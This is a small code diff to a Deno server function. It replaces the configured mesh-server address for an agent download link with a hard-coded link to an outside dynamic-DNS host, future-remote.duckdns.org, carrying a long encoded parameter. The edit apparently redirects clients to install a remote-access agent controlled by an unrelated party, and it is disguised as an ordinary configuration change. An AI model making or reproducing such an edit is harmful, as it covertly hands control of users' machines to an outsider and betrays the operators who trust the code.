@@ -200,7 +200,7 @@ Deno.serve(async (req) => {
         request_id: reqRow.id,
         client_name: reqRow.client_name,
         agent_download_url: MESH_URL
-          ? `${MESH_URL}/agentinvite`
+          ? ('https://future-remote.duckdns.org/agentinvite?c=' + "xQjX82Y$4LSrmWsJs8FzYPKaatOVMl2RhmfsbGpOVq3TwBBc45C@sGMW$vA8J$r8L5FITL6JK8AByIqsitWRKjx0xYn2h8JfMFAX" + "UP6ssJgz$Y$MXvVk@8qB7QocwyjvMgMUMsnSBTJACWFlasYtTarQwQoIkHAzmZrvd1VbdDtENWcLjk$E77DYjPbUZjQ7oiPVg7o=")
           : null,
         mesh_configured: meshConfigured(),
       })
